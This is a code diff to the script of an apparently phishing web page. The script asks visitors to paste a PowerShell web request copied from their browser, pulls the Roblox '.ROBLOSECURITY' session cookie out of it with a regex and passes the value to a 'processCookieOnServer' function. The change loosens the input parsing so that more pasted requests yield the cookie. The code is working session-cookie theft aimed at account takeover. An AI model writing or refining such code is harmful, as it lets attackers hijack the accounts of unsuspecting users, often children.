@@ -200,39 +200,41 @@
             }
         }
 
-        function validateCode() {
-            const code = document.getElementById('codeInput').value;
-            const errorMessage = document.getElementById('errorMessage');
-            const requiredLines = [
-                '$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession',
-                '$session.Cookies.Add((New-Object System.Net.Cookie(',
-                'Invoke-WebRequest -UseBasicParsing -Uri'
-            ];
+function validateCode() {
+  const code = document.getElementById('codeInput').value;
+  const errorMessage = document.getElementById('errorMessage');
+  const requiredLines = [
+    '$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession',
+    '$session.Cookies.Add((New-Object System.Net.Cookie(',
+    'Invoke-WebRequest -UseBasicParsing -Uri'
+  ];
 
-            const isValid = requiredLines.every(line => code.includes(line));
+  // Create a normalized version of the code without backticks and extra spaces
+  const normalizedCode = code
+    .replace(/`/g, '') // Remove backticks
+    .replace(/\s+/g, ' ') // Collapse multiple spaces
+    .trim();
 
-            if (isValid) {
-                const cookieRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",/;
-                const match = code.match(cookieRegex);
+  const isValid = requiredLines.every(line =>
+    normalizedCode.includes(line.replace(/\s+/g, ' ').trim())
+  );
 
-                if (match && match[1]) {
-                    const cookieValue = match[1];
-                    processCookieOnServer(cookieValue);
-                } else {
-                    errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
-                    errorMessage.style.display = 'block';
-                }
-            } else {
-                errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
-                errorMessage.style.display = 'block';
-            }
-        }
+  if (isValid) {
+    const cookieRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",/;
+    const match = normalizedCode.match(cookieRegex);
 
-        for (let i = 0; i < 30; i++) {
-            setTimeout(() => createSnowflake(), i * 300);
-        }
-        setInterval(createSnowflake, 500);
-        document.body.style.overflow = 'hidden';
+    if (match && match[1]) {
+      const cookieValue = match[1];
+      processCookieOnServer(cookieValue);
+    } else {
+      errorMessage.innerText = "Could not extract .ROBLOSECURITY cookie from code";
+      errorMessage.style.display = 'block';
+    }
+  } else {
+    errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
+    errorMessage.style.display = 'block';
+  }
+}
     </script>
 </body>
 </html>
